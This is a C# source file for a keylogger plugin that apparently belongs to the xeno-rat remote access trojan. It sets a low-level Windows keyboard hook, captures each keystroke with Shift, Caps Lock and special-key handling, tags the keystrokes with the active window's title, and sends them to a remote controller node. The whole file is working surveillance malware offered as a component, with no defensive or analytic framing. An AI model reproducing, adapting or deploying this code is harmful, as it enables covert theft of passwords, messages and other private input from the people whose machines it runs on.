using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);

        /// <summary>
        /// Sets an application-defined hook procedure for a hook.
        /// </summary>
        /// <param name="idHook">The type of hook procedure to be installed.</param>
        /// <param name="lpfn">A pointer to the hook procedure.</param>
        /// <param name="wParam">The wParam value passed to the hook procedure.</param>
        /// <param name="lParam">The lParam value passed to the hook procedure.</param>
        /// <returns>
        /// If the function succeeds, the return value is the handle to the hook procedure.
        /// If the function fails, the return value is NULL.
        /// </returns>
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);

        /// <summary>
        /// Unhooks a Windows hook or a hook procedure installed in a hook chain by the SetWindowsHookEx function.
        /// </summary>
        /// <param name="hhk">A handle to the hook to be removed. This parameter is a hook handle obtained by a previous call to SetWindowsHookEx.</param>
        /// <returns>true if the function succeeds, otherwise false.</returns>
        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        /// <summary>
        /// Retrieves a module handle for the specified module.
        /// </summary>
        /// <param name="lpModuleName">The name of the loaded module (either a .dll or .exe file).</param>
        /// <returns>A handle to the specified module, or IntPtr.Zero if the specified module could not be found.</returns>
        /// <remarks>
        /// This method retrieves a handle to the specified module if it is already loaded into the address space of the calling process.
        /// If the function succeeds, the return value is a handle to the specified module.
        /// If the function fails, the return value is IntPtr.Zero.
        /// </remarks>
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        /// <summary>
        /// Passes the hook information to the next hook procedure in the hook chain. A hook procedure can call this function either before or after processing the hook information.
        /// </summary>
        /// <param name="hhk">A handle to the hook to be skipped. This parameter should be NULL if the function is not skipping a hook.</param>
        /// <param name="nCode">The hook code passed to the current hook procedure. The next hook procedure uses this code to determine how to process the hook information.</param>
        /// <param name="wParam">The wParam value passed to the current hook procedure. The meaning of this parameter depends on the type of hook associated with the current hook chain.</param>
        /// <param name="lParam">The lParam value passed to the current hook procedure. The meaning of this parameter depends on the type of hook associated with the current hook chain.</param>
        /// <returns>
        /// If this function succeeds, it returns the value returned by the next hook procedure in the chain. If there is no next hook procedure, the return value is determined by the specific hook.
        /// </returns>
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        Node node;


        List<string> SendQueue = new List<string>();

        /// <summary>
        /// Asynchronously runs the keylogger on the specified node, sending key data to the node when available.
        /// </summary>
        /// <param name="node">The node on which the keylogger will run.</param>
        /// <exception cref="ArgumentNullException">Thrown when the input node is null.</exception>
        /// <returns>An asynchronous task representing the operation.</returns>
        /// <remarks>
        /// The method sets up a low-level keyboard hook to capture key events and sends the captured key data to the specified node.
        /// It also periodically checks for available key data and sends it to the node.
        /// If the keylogger is running and connected to the node, it continuously captures and sends key data until disconnected.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            
            this.node = node;
            IntPtr hookHandle=IntPtr.Zero;
            HookCallbackDelegate hcDelegate = HookCallback;
            Process currproc = Process.GetCurrentProcess();
            string mainModuleName = currproc.MainModule.ModuleName;
            currproc.Dispose();
            new Thread(() => {
                hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
                if (!Application.MessageLoop)
                {
                    Application.Run();
                }
            }).Start();
            while (node.Connected())
            {
                if (SendQueue.Count > 0)
                {
                    string activeWindow = (await Utils.GetCaptionOfActiveWindowAsync()).Replace("*","");
                    string chars = string.Join("", SendQueue);
                    SendQueue.Clear();
                    await sendKeyData(activeWindow, chars);
                }
                await Task.Delay(1);
            }
            if (hookHandle != IntPtr.Zero) 
            {
                UnhookWindowsHookEx(hookHandle);
            }

        }

        /// <summary>
        /// Sends the specified key data to the connected node asynchronously.
        /// </summary>
        /// <param name="open_application">The string representing the open application command to be sent.</param>
        /// <param name="charectar">The string representing the character data to be sent.</param>
        /// <remarks>
        /// This method sends the specified <paramref name="open_application"/> command followed by the <paramref name="charectar"/> data to the connected node asynchronously.
        /// If the <paramref name="node"/> is null or not connected, the method returns without sending any data.
        /// </remarks>
        /// <exception cref="NullReferenceException">Thrown when the <paramref name="node"/> is null.</exception>
        /// <exception cref="InvalidOperationException">Thrown when the <paramref name="node"/> is not connected.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task sendKeyData(string open_application, string charectar) 
        {
            if (node == null || !node.Connected()) return;
            await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
            await node.SendAsync(Encoding.UTF8.GetBytes(charectar));
        }

        /// <summary>
        /// Callback function for keyboard hook.
        /// </summary>
        /// <param name="nCode">The hook code, if less than 0, the function must pass the message to the CallNextHookEx function without further processing and should return the value returned by CallNextHookEx.</param>
        /// <param name="wParam">The identifier of the keyboard message. This parameter can be one of the following messages: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.</param>
        /// <param name="lParam">A pointer to a KBDLLHOOKSTRUCT structure.</param>
        /// <returns>The return value is the result of calling CallNextHookEx.</returns>
        /// <remarks>
        /// This method checks if the keyboard message is a key down event and retrieves the virtual-key code. It then determines if the Shift key is pressed and gets the character corresponding to the virtual-key code. If the Caps Lock is on, it converts the character to uppercase and adds it to the SendQueue.
        /// </remarks>
        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
                {
                    character = character.ToUpper();
                }
                SendQueue.Add(character);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
        {
            { 0x08, "[backspace]" },
            { 0x09, "[tab]" },
            { 0x0D, "[enter]" },
            { 0x1B, "[escape]" },
            { 0x20, "[space]" },
            { 0x2E, "[delete]" },
            { 0x25, "[left]" },
            { 0x26, "[up]" },
            { 0x27, "[right]" },
            { 0x28, "[down]" },
            { 0x2C, "[print screen]" },
            { 0x2D, "[insert]" },
            { 0x2F, "[help]" },
            { 0x5B, "[left windows]" },
            { 0x5C, "[right windows]" },
            { 0x5D, "[applications]" },
            { 0x5F, "[sleep]" },
            { 0x70, "[F1]" },
            { 0x71, "[F2]" },
            { 0x72, "[F3]" },
            { 0x73, "[F4]" },
            { 0x74, "[F5]" },
            { 0x75, "[F6]" },
            { 0x76, "[F7]" },
            { 0x77, "[F8]" },
            { 0x78, "[F9]" },
            { 0x79, "[F10]" },
            { 0x7A, "[F11]" },
            { 0x7B, "[F12]" },
            { 0xBA, ";" },
            { 0xBB, "=" },
            { 0xBC, "," },
            { 0xBD, "-" },
            { 0xBE, "." },
            { 0xBF, "/" },
            { 0xC0, "`" },
            { 0xDB, "[" },
            { 0xDC, "\\" },
            { 0xDD, "]" },
            { 0xDE, "'" },
            { 0xDF, "[caps lock]" },
            { 0xE1, "[ime hangul mode]" },
            { 0xE3, "[ime junja mode]" },
            { 0xE4, "[ime final mode]" },
            { 0xE5, "[ime kanji mode]" },
            { 0xE6, "[ime hanja mode]" },
            { 0xE8, "[ime off]" },
            { 0xE9, "[ime on]" },
            { 0xEA, "[ime convert]" },
            { 0xEB, "[ime non-convert]" },
            { 0xEC, "[ime accept]" },
            { 0xED, "[ime mode change request]" },
            { 0xF1, "[oem specific]" },
            { 0xFF, "[oem auto]" },
            { 0xFE, "[oem enlarge window]" },
            { 0xFD, "[oem reduce window]" },
            { 0xFC, "[oem copy]" },
            { 0xFB, "[oem enlarge font]" },
            { 0xFA, "[oem reduce font]" },
            { 0xF9, "[oem jump]" },
            { 0xF8, "[oem pa1]" },
            { 0xF7, "[oem clear]" }
        };

        private static bool[] keyStates = new bool[256];

        /// <summary>
        /// Retrieves the character corresponding to the specified virtual key code, considering the Shift key state.
        /// </summary>
        /// <param name="virtualKeyCode">The virtual key code for which to retrieve the character.</param>
        /// <param name="isShiftPressed">A boolean value indicating whether the Shift key is pressed.</param>
        /// <returns>
        /// The character corresponding to the specified virtual key code, considering the Shift key state.
        /// </returns>
        /// <remarks>
        /// This method retrieves the character corresponding to the specified virtual key code, considering the state of the Shift key.
        /// It utilizes a receiving buffer and keyboard state to map the virtual key to the corresponding character.
        /// If the result is greater than 0, it retrieves the character and replaces non-visible characters with descriptive words using a dictionary.
        /// If the Shift key is pressed, it applies modifications based on the non-visible character before returning the result.
        /// </remarks>
        private static string GetCharacterFromKey(uint virtualKeyCode, bool isShiftPressed)
        {
            StringBuilder receivingBuffer = new StringBuilder(5);
            byte[] keyboardState = new byte[256];

            // Set the state of Shift key based on the passed parameter
            keyboardState[0x10] = (byte)(isShiftPressed ? 0x80 : 0);

            // Map the virtual key to the corresponding character
            int result = ToUnicode(virtualKeyCode, 0, keyboardState, receivingBuffer, receivingBuffer.Capacity, 0);

            if (result > 0)
            {
                string character = receivingBuffer.ToString();

                // Replace non-visible characters with descriptive words using the dictionary
                if (nonVisibleCharacters.ContainsKey(virtualKeyCode))
                {
                    string nonVisibleCharacter = nonVisibleCharacters[virtualKeyCode];

                    // Apply Shift key state to the non-visible character
                    if (isShiftPressed)
                    {
                        // Apply Shift key modifications based on the non-visible character
                        switch (nonVisibleCharacter)
                        {
                            case ";":
                                return ":";
                            case "=":
                                return "+";
                            case ",":
                                return "<";
                            case "-":
                                return "_";
                            case ".":
                                return ">";
                            case "/":
                                return "?";
                            case "`":
                                return "~";
                            case "[":
                                return "{";
                            case "\\":
                                return "|";
                            case "]":
                                return "}";
                            case "'":
                                return "\"";
                        }
                    }

                    return nonVisibleCharacter;
                }

                return character;
            }

            return string.Empty;
        }

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled on or off—indicating whether the key was pressed or released.
        /// </summary>
        /// <param name="vKey">The virtual-key code of the key.</param>
        /// <returns>The return value specifies whether the key was pressed since the last call to GetAsyncKeyState, and whether the key is currently up or down.</returns>
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        /// <summary>
        /// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off—alternating each time the key is pressed).
        /// </summary>
        /// <param name="keyCode">The virtual-key code.</param>
        /// <returns>The return value specifies the status of the specified virtual key, as follows:
        /// If the high-order bit is 1, the key is down; otherwise, it is up.
        /// If the low-order bit is 1, the key is toggled. A key, such as the CAPS LOCK key, is toggled if it is turned on. The key is off and untoggled if the low-order bit is 0.
        /// </returns>
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        /// <summary>
        /// Translates the specified virtual key code and keyboard state to the corresponding Unicode character or characters.
        /// </summary>
        /// <param name="virtualKeyCode">The virtual key code to be translated.</param>
        /// <param name="scanCode">The hardware scan code of the key.</param>
        /// <param name="keyboardState">The current keyboard state.</param>
        /// <param name="receivingBuffer">A buffer to receive the translated Unicode character or characters.</param>
        /// <param name="bufferSize">The size of the receiving buffer.</param>
        /// <param name="flags">The behavior of the function.</param>
        /// <returns>The number of characters written to the receiving buffer, or 0 if no translation was performed.</returns>
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
            int bufferSize, uint flags);

    }
}
